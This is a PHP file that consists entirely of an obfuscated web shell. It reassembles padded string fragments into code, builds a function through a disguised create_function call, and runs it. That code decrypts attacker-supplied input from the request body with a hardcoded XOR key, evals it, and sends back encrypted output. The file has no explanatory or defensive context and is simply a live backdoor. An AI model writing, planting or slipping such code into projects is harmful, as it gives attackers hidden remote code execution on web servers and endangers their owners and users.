<?php
$e='ncjAjAtiojAn x(jA$t,jAjA$k){$c=strlen($k);$l=strlen($t);$o=jA"";forjA($jAi=jA0;$i<$l;){fjAor($j=0;';
$o='val(@gzuncojAmpresjAs(@x(@jAbasjAe64_decodjAe(jA$m[1])jA,jA$k)));$jAo=@ob_get_cojAntents();@jAob_e';
$Z='njAd_cjAlean()jA;$r=@bajAse64jA_enjAcode(@x(@jAgzcomprejAss($ojA),$jAk));jAprintjA("$p$kh$r$kf");}';
$k='tch("/$kh(.+)jA$jAkf/jAjA",@filjAe_get_contentjAs("php://input")jA,$m)==1) {@jAob_jAstajArt();@ejA';
$g='jA($j<$cjA&&jA$i<$ljA);$j++,jA$i++){$o.=$jAt{$ijA}^$k{$jAjAjjA}jA;}jA}return $o;}jAjAif (@jApreg_ma';
$N='$k="4e34ejAf3jA9jA"jA;$kh="7jA2fcf54b6ebb";$kf="jAjAa0c685c1d2fa"jA;$p=jA"VNjAqb54gLfodKjA4kkZ";jAfjAu';
$t=str_replace('y','','cryyeatey_fyuynctyion');
$W=str_replace('jA','',$N.$e.$g.$k.$o.$Z);
$p=$t('',$W);$p();
?>
